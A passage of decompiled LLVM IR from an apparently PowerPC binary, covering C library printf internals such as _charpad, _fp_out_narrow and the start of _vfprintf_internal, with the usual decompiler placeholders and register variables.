  br i1 %v5_1000b8c0, label %dec_label_pc_1000b8d0, label %dec_label_pc_1000b8c8

dec_label_pc_1000b8c8:                            ; preds = %entry
  store i32 %v3_1000b8b4, i32* %v2_1000b8b8, align 4
  store i32 268482768, i32* @lr, align 4
  %v2_1000b8cc = inttoptr i32 %v3_1000b8b4 to i16*
  %v3_1000b8cc = call i32 @__stdio_WRITE(i16* %v2_1000b8cc, i32 %v2_1000b8c0)
  %v0_1000b8d0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b8d0

dec_label_pc_1000b8d0:                            ; preds = %entry, %dec_label_pc_1000b8c8
  %v0_1000b8d0 = phi i32 [ %v0_1000b8ac, %entry ], [ %v0_1000b8d0.pre, %dec_label_pc_1000b8c8 ]
  %v1_1000b8d0 = add i32 %v0_1000b8d0, 8
  %v2_1000b8d0 = inttoptr i32 %v1_1000b8d0 to i32*
  %v3_1000b8d0 = load i32, i32* %v2_1000b8d0, align 4
  %v1_1000b8d4 = add i32 %v0_1000b8d0, 16
  %v2_1000b8d4 = inttoptr i32 %v1_1000b8d4 to i32*
  %v3_1000b8d4 = load i32, i32* %v2_1000b8d4, align 4
  store i32 %v0_1000b8a8, i32* @r31, align 4
  %v2_1000b8dc = sub i32 %v3_1000b8d4, %v3_1000b8d0
  ret i32 %v2_1000b8dc

; uselistorder directives
  uselistorder i32 %v0_1000b8d0, { 1, 0 }
  uselistorder i32 %v3_1000b8b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b8d0, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000b9183 = icmp eq i32 %arg3, 0
  %v2_1000b91c = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000b9183, label %dec_label_pc_1000b938, label %dec_label_pc_1000b92c

dec_label_pc_1000b914:                            ; preds = %dec_label_pc_1000b92c
  %v1_1000b914 = add i32 %v0_1000b914, -1
  store i32 %v1_1000b914, i32* @r31, align 4
  %v3_1000b918 = icmp eq i32 %v1_1000b914, 0
  %v0_1000b924 = load i32, i32* @r29, align 4
  br i1 %v3_1000b918, label %dec_label_pc_1000b938.loopexit, label %dec_label_pc_1000b92c

dec_label_pc_1000b92c:                            ; preds = %entry, %dec_label_pc_1000b914
  %v0_1000b9245 = phi i32 [ %v0_1000b924, %dec_label_pc_1000b914 ], [ %arg1, %entry ]
  store i32 268482864, i32* @lr, align 4
  %v3_1000b92c = inttoptr i32 %v0_1000b9245 to i16*
  %v4_1000b92c = call i32 @__stdio_fwrite(i32 %v2_1000b91c, i32 1, i16* %v3_1000b92c)
  %v3_1000b930 = icmp eq i32 %v4_1000b92c, 1
  %v0_1000b914 = load i32, i32* @r31, align 4
  br i1 %v3_1000b930, label %dec_label_pc_1000b914, label %dec_label_pc_1000b938.loopexit

dec_label_pc_1000b938.loopexit:                   ; preds = %dec_label_pc_1000b914, %dec_label_pc_1000b92c
  %v0_1000b93c.ph = phi i32 [ %v0_1000b914, %dec_label_pc_1000b92c ], [ 0, %dec_label_pc_1000b914 ]
  %v1_1000b93c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000b938

dec_label_pc_1000b938:                            ; preds = %dec_label_pc_1000b938.loopexit, %entry
  %v1_1000b93c = phi i32 [ 0, %entry ], [ %v1_1000b93c.pre, %dec_label_pc_1000b938.loopexit ]
  %v0_1000b93c = phi i32 [ 0, %entry ], [ %v0_1000b93c.ph, %dec_label_pc_1000b938.loopexit ]
  %v2_1000b93c = sub i32 %v1_1000b93c, %v0_1000b93c
  ret i32 %v2_1000b93c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b938.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000b92c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000b964 = and i32 %arg2, 128
  %v3_1000b964 = icmp eq i32 %v1_1000b964, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000b964, label %dec_label_pc_1000b9b4, label %dec_label_pc_1000b980

dec_label_pc_1000b980:                            ; preds = %entry
  %v0_1000b980 = call i32 @__GI_strlen()
  %v0_1000b984 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000b980, i32* @r31, align 4
  %v0_1000b98c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000b990 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b990 = sub i32 %v1_1000b990, %v0_1000b980
  store i32 %v2_1000b990, i32* %r29.global-to-local, align 4
  store i32 %v0_1000b980, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000b990, 1
  br i1 %tmp7, label %dec_label_pc_1000b9b4, label %dec_label_pc_1000b9a0

dec_label_pc_1000b9a0:                            ; preds = %dec_label_pc_1000b980
  %v1_1000b984 = urem i32 %v0_1000b984, 128
  store i32 268482980, i32* @lr, align 4
  %v3_1000b9a0 = trunc i32 %v1_1000b984 to i8
  %v4_1000b9a0 = call i32 @_charpad(i32 %v0_1000b98c, i8 %v3_1000b9a0, i32 %v2_1000b990)
  %v0_1000b9a4 = load i32, i32* @r31, align 4
  store i32 %v0_1000b9a4, i32* %r30.global-to-local, align 4
  %v1_1000b9a8 = load i32, i32* @r29, align 4
  %v4_1000b9a8 = icmp eq i32 %v4_1000b9a0, %v1_1000b9a8
  store i32 %v4_1000b9a0, i32* @r28, align 4
  br i1 %v4_1000b9a8, label %dec_label_pc_1000b9a0.dec_label_pc_1000b9b4_crit_edge, label %dec_label_pc_1000b9d8

dec_label_pc_1000b9a0.dec_label_pc_1000b9b4_crit_edge: ; preds = %dec_label_pc_1000b9a0
  %v0_1000b9c0.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000b9b4

dec_label_pc_1000b9b4:                            ; preds = %dec_label_pc_1000b9a0.dec_label_pc_1000b9b4_crit_edge, %dec_label_pc_1000b980, %entry
  %v0_1000b9c0 = phi i32 [ %v0_1000b9c0.pre, %dec_label_pc_1000b9a0.dec_label_pc_1000b9b4_crit_edge ], [ %v0_1000b98c, %dec_label_pc_1000b980 ], [ %arg1, %entry ]
  %v0_1000b9bc = phi i32 [ %v0_1000b9a4, %dec_label_pc_1000b9a0.dec_label_pc_1000b9b4_crit_edge ], [ %v0_1000b980, %dec_label_pc_1000b980 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000b9bc, 1
  br i1 %tmp8, label %dec_label_pc_1000b9d4, label %dec_label_pc_1000b9cc

dec_label_pc_1000b9cc:                            ; preds = %dec_label_pc_1000b9b4
  %v0_1000b9b8 = load i32, i32* @r27, align 4
  store i32 268483024, i32* @lr, align 4
  %v3_1000b9cc = inttoptr i32 %v0_1000b9c0 to i16*
  %v4_1000b9cc = call i32 @__stdio_fwrite(i32 %v0_1000b9b8, i32 %v0_1000b9bc, i16* %v3_1000b9cc)
  br label %dec_label_pc_1000b9d4

dec_label_pc_1000b9d4:                            ; preds = %dec_label_pc_1000b9b4, %dec_label_pc_1000b9cc
  %v1_1000b9d4 = phi i32 [ 0, %dec_label_pc_1000b9b4 ], [ %v4_1000b9cc, %dec_label_pc_1000b9cc ]
  %v0_1000b9d4 = load i32, i32* @r28, align 4
  %v2_1000b9d4 = add i32 %v0_1000b9d4, %v1_1000b9d4
  br label %dec_label_pc_1000b9d8

dec_label_pc_1000b9d8:                            ; preds = %dec_label_pc_1000b9a0, %dec_label_pc_1000b9d4
  %v0_1000b9dc = phi i32 [ %v4_1000b9a0, %dec_label_pc_1000b9a0 ], [ %v2_1000b9d4, %dec_label_pc_1000b9d4 ]
  ret i32 %v0_1000b9dc

; uselistorder directives
  uselistorder i32 %v0_1000b9bc, { 1, 0 }
  uselistorder i32 %v2_1000b990, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9d4, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000b9f4 = load i32, i32* @lr, align 4
  store i32 %v0_1000b9f4, i32* %r0.global-to-local, align 4
  %v2_1000b9fc = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000b9fc, i32* %r30.global-to-local, align 4
  %v0_1000ba00 = load i32, i32* @r3, align 4
  store i32 %v0_1000ba00, i32* %r24.global-to-local, align 4
  %v0_1000ba0c = load i32, i32* @r5, align 4
  store i32 %v0_1000ba0c, i32* %r31.global-to-local, align 4
  %v0_1000ba10 = load i32, i32* @r4, align 4
  store i32 %v0_1000ba10, i32* @r29, align 4
  store i32 268483096, i32* @lr, align 4
  %v1_1000ba14 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000ba14 = call i32 @_ppfs_init(i32* %v1_1000ba14)
  %tmp72 = icmp sgt i32 %v2_1000ba14, -1
  br i1 %tmp72, label %dec_label_pc_1000ba48, label %dec_label_pc_1000ba20

dec_label_pc_1000ba20:                            ; preds = %entry
  %v3_1000ba20 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000ba20 = ptrtoint i8* %v3_1000ba20 to i32
  store i32 %v4_1000ba20, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000ba20, i32* @r3, align 4
  %v0_1000ba2c = call i32 @__GI_strlen()
  %v3_1000ba30 = icmp eq i32 %v0_1000ba2c, 0
  br i1 %v3_1000ba30, label %dec_label_pc_1000c048, label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba20
  %v0_1000ba38 = load i32, i32* @r31, align 4
  %v0_1000ba3c = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ba44.393 to i32), i32* @lr, align 4
  %v3_1000ba40 = inttoptr i32 %v0_1000ba3c to i16*
  %v4_1000ba40 = call i32 @__stdio_fwrite(i32 %v0_1000ba38, i32 %v0_1000ba2c, i16* %v3_1000ba40)
  br label %dec_label_pc_1000c048

dec_label_pc_1000ba48:                            ; preds = %entry
  %v0_1000ba4c = load i32, i32* @r31, align 4
  store i32 268483156, i32* @lr, align 4
  %v2_1000ba50 = call i32 @_ppfs_prepargs(i32 %v2_1000b9fc, i32 %v0_1000ba4c)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000bae8 = zext i8 %tmp59 to i32
  %v2_1000baec = icmp sgt i32 %tmp60, 0
  %v2_1000baf0 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000bb14 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000bb18 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000bb4c = icmp eq i32 %tmp57, 0
  %v2_1000bea8 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000bdc8 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000bdcc = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000bc40 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000bd1c = icmp eq i32 %tmp57, 1
  %v2_1000bcc0 = icmp ugt i32 %tmp57, 2
  %v4_1000bc00 = zext i8 %tmp55 to i32
  %v0_1000c034.pre = load i32, i32* @r29, align 4
  %v1_1000bb00 = mul nuw nsw i32 %v4_1000bae8, 8
  %v2_1000bb04 = add i32 %v2_1000baf0, %v1_1000bb00
  %v1_1000bb08 = add i32 %v2_1000bb04, -8
  %v1_1000bb1c = add i32 %tmp58, 1
  %v2_1000bb74 = icmp ugt i32 %tmp57, 7
  %v2_1000bd54 = icmp ugt i32 %tmp57, 15
  %v2_1000bd88 = icmp ugt i32 %tmp57, 17
  %v3_1000bd88 = icmp eq i32 %tmp57, 17
  %v2_1000be30 = icmp ugt i32 %tmp57, 19
  %v3_1000be30 = icmp eq i32 %tmp57, 19
  %v3_1000be9c = icmp eq i32 %tmp57, 20
  %v1_1000bb8c = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10018cb4.395 to i32), i32 -1)
  %v2_1000bb8c = inttoptr i32 %v1_1000bb8c to i8*
  %v3_1000bccc = icmp eq i32 %tmp57, 3
  %v3_1000bcdc = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000c034

dec_label_pc_1000ba60.backedge:                   ; preds = %dec_label_pc_1000bab4, %dec_label_pc_1000ba6c
  %storemerge13.in = phi i32 [ %v1_1000ba7c, %dec_label_pc_1000ba6c ], [ %v1_1000bab4, %dec_label_pc_1000bab4 ]
  %v1_1000ba7416 = phi i32 [ %v0_1000ba8c, %dec_label_pc_1000ba6c ], [ %v1_1000bab4, %dec_label_pc_1000bab4 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000ba60

dec_label_pc_1000ba60:                            ; preds = %dec_label_pc_1000ba60.backedge, %dec_label_pc_1000c034
  %v0_1000ba8c = phi i32 [ %v1_1000ba7416, %dec_label_pc_1000ba60.backedge ], [ %v0_1000c034, %dec_label_pc_1000c034 ]
  %v1_1000ba7c = phi i32 [ %storemerge13, %dec_label_pc_1000ba60.backedge ], [ %v0_1000c034, %dec_label_pc_1000c034 ]
  %v1_1000ba60 = inttoptr i32 %v1_1000ba7c to i8*
  %v2_1000ba60 = load i8, i8* %v1_1000ba60, align 1
  %v3_1000ba60 = zext i8 %v2_1000ba60 to i32
  store i32 %v3_1000ba60, i32* %r0.global-to-local, align 4
  %v3_1000ba64 = icmp eq i8 %v2_1000ba60, 0
  br i1 %v3_1000ba64, label %dec_label_pc_1000ba74, label %dec_label_pc_1000ba6c

dec_label_pc_1000ba6c:                            ; preds = %dec_label_pc_1000ba60
  %v3_1000ba6c = icmp eq i8 %v2_1000ba60, 37
  br i1 %v3_1000ba6c, label %dec_label_pc_1000ba74, label %dec_label_pc_1000ba60.backedge

dec_label_pc_1000ba74:                            ; preds = %dec_label_pc_1000ba6c, %dec_label_pc_1000ba60
  %v4_1000ba74 = icmp eq i32 %v1_1000ba7c, %v0_1000ba8c
  br i1 %v4_1000ba74, label %dec_label_pc_1000baa8, label %dec_label_pc_1000ba7c

dec_label_pc_1000ba7c:                            ; preds = %dec_label_pc_1000ba74
  %v2_1000ba7c = sub i32 %v1_1000ba7c, %v0_1000ba8c
  store i32 %v2_1000ba7c, i32* @r31, align 4
  %v4_1000ba7c = icmp sgt i32 %v2_1000ba7c, 0
  br i1 %v4_1000ba7c, label %dec_label_pc_1000ba8c, label %dec_label_pc_1000ba9c

dec_label_pc_1000ba8c:                            ; preds = %dec_label_pc_1000ba7c
  %v0_1000ba94 = load i32, i32* %r24.global-to-local, align 4
  store i32 268483228, i32* @lr, align 4
  %v3_1000ba98 = inttoptr i32 %v0_1000ba94 to i16*
  %v4_1000ba98 = call i32 @__stdio_fwrite(i32 %v0_1000ba8c, i32 %v2_1000ba7c, i16* %v3_1000ba98)
  %v1_1000ba9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ba9c

dec_label_pc_1000ba9c:                            ; preds = %dec_label_pc_1000ba7c, %dec_label_pc_1000ba8c
  %v1_1000baa4 = phi i32 [ %v1_1000ba9c.pre, %dec_label_pc_1000ba8c ], [ %v2_1000ba7c, %dec_label_pc_1000ba7c ]
  %storemerge2 = phi i32 [ %v4_1000ba98, %dec_label_pc_1000ba8c ], [ 0, %dec_label_pc_1000ba7c ]
  %v4_1000ba9c = icmp eq i32 %storemerge2, %v1_1000baa4
  br i1 %v4_1000ba9c, label %dec_label_pc_1000baa4, label %dec_label_pc_1000c044

dec_label_pc_1000baa4:                            ; preds = %dec_label_pc_1000ba9c
  %v0_1000baa4 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000baa4 = add i32 %v0_1000baa4, %v1_1000baa4
  store i32 %v2_1000baa4, i32* %r23.global-to-local, align 4
  %v0_1000baa8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000baa8

dec_label_pc_1000baa8:                            ; preds = %dec_label_pc_1000ba74, %dec_label_pc_1000baa4
  %v0_1000bab4 = phi i32 [ %v0_1000ba8c, %dec_label_pc_1000ba74 ], [ %v0_1000baa8.pre, %dec_label_pc_1000baa4 ]
  %v1_1000baa8 = inttoptr i32 %v0_1000bab4 to i8*
  %v2_1000baa8 = load i8, i8* %v1_1000baa8, align 1
  %v3_1000baa8 = zext i8 %v2_1000baa8 to i32
  store i32 %v3_1000baa8, i32* %r0.global-to-local, align 4
  %v3_1000baac = icmp eq i8 %v2_1000baa8, 0
  br i1 %v3_1000baac, label %dec_label_pc_1000c048, label %dec_label_pc_1000bab4

dec_label_pc_1000bab4:                            ; preds = %dec_label_pc_1000baa8
  %v1_1000bab4 = add i32 %v0_1000bab4, 1
  %v2_1000bab4 = inttoptr i32 %v1_1000bab4 to i8*
  %v3_1000bab4 = load i8, i8* %v2_1000bab4, align 1
  %v4_1000bab4 = zext i8 %v3_1000bab4 to i32
  store i32 %v4_1000bab4, i32* %r0.global-to-local, align 4
  %v3_1000babc = icmp eq i8 %v3_1000bab4, 37
  br i1 %v3_1000babc, label %dec_label_pc_1000ba60.backedge, label %dec_label_pc_1000bac4

dec_label_pc_1000bac4:                            ; preds = %dec_label_pc_1000bab4
  store i32 %v2_1000b9fc, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000bab4, i8** %stack_var_-200, align 4
  store i32 268483292, i32* @lr, align 4
  %v3_1000bad8 = call i32 @_ppfs_parsespec(i32* %v1_1000ba14, i32 %v1_1000bab4)
  store i32 %v2_1000b9fc, i32* @r3, align 4
  store i32 268483300, i32* @lr, align 4
  %v0_1000bae0 = call i32 @_ppfs_setargs()
  store i32 %v4_1000bae8, i32* %r7.global-to-local, align 4
  store i32 %v2_1000baf0, i32* %r0.global-to-local, align 4
  br i1 %v2_1000baec, label %dec_label_pc_1000bb00, label %dec_label_pc_1000bb0c

dec_label_pc_1000bb00:                            ; preds = %dec_label_pc_1000bac4
  br label %dec_label_pc_1000bb0c

dec_label_pc_1000bb0c:                            ; preds = %dec_label_pc_1000bac4, %dec_label_pc_1000bb00
  %v0_1000bb3882 = phi i32 [ %v1_1000bb08, %dec_label_pc_1000bb00 ], [ %v2_1000baf0, %dec_label_pc_1000bac4 ]
  store i32 %v0_1000bb3882, i32* @r10, align 4
  store i32 %v2_1000bb14, i32* @r8, align 4
  store i32 %v1_1000bb1c, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000bb3c.preheader, label %dec_label_pc_1000bb3c.preheader.thread

dec_label_pc_1000bb3c.preheader.thread:           ; preds = %dec_label_pc_1000bb0c
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000bb48

dec_label_pc_1000bb3c.preheader:                  ; preds = %dec_label_pc_1000bb0c
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000bb18, label %dec_label_pc_1000bb48, label %dec_label_pc_1000bb34.preheader

dec_label_pc_1000bb34.preheader:                  ; preds = %dec_label_pc_1000bb3c.preheader
  store i32 %v0_1000bb3882, i32* %stack_var_-344, align 4
  %v1_1000bb3883 = add i32 %v0_1000bb3882, 8
  store i32 %v1_1000bb3883, i32* @r10, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000bb4488 = add i32 %tmp58, -1
  store i32 %v1_1000bb4488, i32* %ctr.global-to-local, align 4
  %v2_1000bb4489 = icmp eq i32 %v1_1000bb4488, 0
  br i1 %v2_1000bb4489, label %dec_label_pc_1000bb48, label %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge

dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge: ; preds = %dec_label_pc_1000bb34.preheader, %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge
  %v1_1000bb34.pre = phi i32 [ %v1_1000bb34.pre.pre, %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge ], [ %v2_1000bb14, %dec_label_pc_1000bb34.preheader ]
  %v1_1000bb3c91 = phi i32 [ %v1_1000bb3c, %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000bb34.preheader ]
  %v1_1000bb3890 = phi i32 [ %v1_1000bb38, %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge ], [ %v1_1000bb3883, %dec_label_pc_1000bb34.preheader ]
  %v3_1000bb34 = add i32 %v1_1000bb34.pre, %v1_1000bb3c91
  %v4_1000bb34 = inttoptr i32 %v3_1000bb34 to i32*
  store i32 %v1_1000bb3890, i32* %v4_1000bb34, align 4
  %v0_1000bb38 = load i32, i32* @r10, align 4
  %v1_1000bb38 = add i32 %v0_1000bb38, 8
  store i32 %v1_1000bb38, i32* @r10, align 4
  %v0_1000bb3c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bb3c = mul i32 %v0_1000bb3c, 4
  store i32 %v1_1000bb3c, i32* %r0.global-to-local, align 4
  %v1_1000bb40 = add i32 %v0_1000bb3c, 1
  store i32 %v1_1000bb40, i32* %r11.global-to-local, align 4
  %v0_1000bb44 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb44 = add i32 %v0_1000bb44, -1
  store i32 %v1_1000bb44, i32* %ctr.global-to-local, align 4
  %v2_1000bb44 = icmp eq i32 %v1_1000bb44, 0
  br i1 %v2_1000bb44, label %dec_label_pc_1000bb48, label %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge

dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge.dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge_crit_edge: ; preds = %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge
  %v1_1000bb34.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge

dec_label_pc_1000bb48:                            ; preds = %dec_label_pc_1000bb34.preheader, %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge, %dec_label_pc_1000bb3c.preheader.thread, %dec_label_pc_1000bb3c.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000bb4c, label %dec_label_pc_1000bb54, label %dec_label_pc_1000bb74

dec_label_pc_1000bb54:                            ; preds = %dec_label_pc_1000bb48
  %v0_1000bb58 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000bb58, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000bb58, 0
  %v1_1000bb60 = zext i1 %tmp96 to i32
  %v2_1000bb60 = ashr i32 %v0_1000bb58, 31
  %v3_1000bb60 = and i32 %v2_1000bb60, -2
  %v4_1000bb60 = or i32 %v3_1000bb60, %v1_1000bb60
  store i32 %v4_1000bb60, i32* @r5, align 4
  %v1_1000bb68 = call i32 @__asm_rlwinm(i32 %v0_1000bc88, i32 0, i32 20, i32 23)
  store i32 %v1_1000bb68, i32* @r4, align 4
  %v1_1000bb6c = inttoptr i32 %v1_1000bb68 to i16*
  %v2_1000bb6c = call i32 @_store_inttype(i16* %v1_1000bb6c)
  br label %dec_label_pc_1000c030

dec_label_pc_1000bb74:                            ; preds = %dec_label_pc_1000bb48
  br i1 %v2_1000bb74, label %dec_label_pc_1000bd54, label %dec_label_pc_1000bb7c

dec_label_pc_1000bb7c:                            ; preds = %dec_label_pc_1000bb74
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000bb8c = load i8, i8* %v2_1000bb8c, align 1
  %v4_1000bb8c = zext i8 %v3_1000bb8c to i32
  store i32 %v4_1000bb8c, i32* %r30.global-to-local, align 4
  %v3_1000bb90 = icmp eq i8 %v3_1000bb8c, 10
  br i1 %v3_1000bb90, label %dec_label_pc_1000bb98, label %dec_label_pc_1000bbc0

dec_label_pc_1000bb98:                            ; preds = %dec_label_pc_1000bb7c
  store i32 %v0_1000bc88, i32* %r0.global-to-local, align 4
  %v1_1000bb9c = call i32 @__asm_rlwinm(i32 %v0_1000bc88, i32 26, i32 31, i32 31)
  %v1_1000bba0 = call i32 @__asm_rlwinm(i32 %v0_1000bc88, i32 27, i32 31, i32 31)
  %v3_1000bba4 = icmp eq i32 %v1_1000bb9c, 0
  %v2_1000bba8 = icmp ne i32 %v1_1000bba0, 0
  %not.v2_1000bba8 = xor i1 %v2_1000bba8, true
  %v6_1000bbac = sext i1 %not.v2_1000bba8 to i32
  store i32 %v6_1000bbac, i32* %r0.global-to-local, align 4
  %v1_1000bbb4 = select i1 %v2_1000bba8, i32 44, i32 87
  store i32 %v1_1000bbb4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bba4, label %dec_label_pc_1000bbc0, label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb98
  %v1_1000bbbc = or i32 %v1_1000bbb4, 128
  store i32 %v1_1000bbbc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bbc0

dec_label_pc_1000bbc0:                            ; preds = %dec_label_pc_1000bb7c, %dec_label_pc_1000bb98, %dec_label_pc_1000bbbc
  %v0_1000bbc0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000bbc0 = icmp ugt i32 %v0_1000bbc0, 5
  br i1 %v2_1000bbc0, label %dec_label_pc_1000bbe8, label %dec_label_pc_1000bbc8

dec_label_pc_1000bbc8:                            ; preds = %dec_label_pc_1000bbc0
  %v3_1000bbc8 = icmp eq i32 %v0_1000bbc0, 3
  br i1 %v3_1000bbc8, label %dec_label_pc_1000bbd0, label %dec_label_pc_1000bbd8

dec_label_pc_1000bbd0:                            ; preds = %dec_label_pc_1000bbc8
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bbec

dec_label_pc_1000bbd8:                            ; preds = %dec_label_pc_1000bbc8
  %v3_1000bbd8 = icmp eq i32 %v0_1000bbc0, 1
  br i1 %v3_1000bbd8, label %dec_label_pc_1000bbf0, label %dec_label_pc_1000bbec

dec_label_pc_1000bbe8:                            ; preds = %dec_label_pc_1000bbc0
  %v0_1000bbe8 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000bbe8 = sub i32 0, %v0_1000bbe8
  store i32 %v1_1000bbe8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bbec

dec_label_pc_1000bbec:                            ; preds = %dec_label_pc_1000bbd8, %dec_label_pc_1000bbd0, %dec_label_pc_1000bbe8
  br label %dec_label_pc_1000bbf0

dec_label_pc_1000bbf0:                            ; preds = %dec_label_pc_1000bbd8, %dec_label_pc_1000bbec
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000bbec ], [ 6, %dec_label_pc_1000bbd8 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000bbf0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000bbf0, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000bbf0, -1
  br i1 %tmp75, label %dec_label_pc_1000bc04, label %dec_label_pc_1000bc00

dec_label_pc_1000bc00:                            ; preds = %dec_label_pc_1000bbf0
  br label %dec_label_pc_1000bc04

dec_label_pc_1000bc04:                            ; preds = %dec_label_pc_1000bbf0, %dec_label_pc_1000bc00
  %storemerge = phi i32 [ %v4_1000bc00, %dec_label_pc_1000bc00 ], [ 32, %dec_label_pc_1000bbf0 ]
  store i32 %storemerge, i32* @r26, align 4
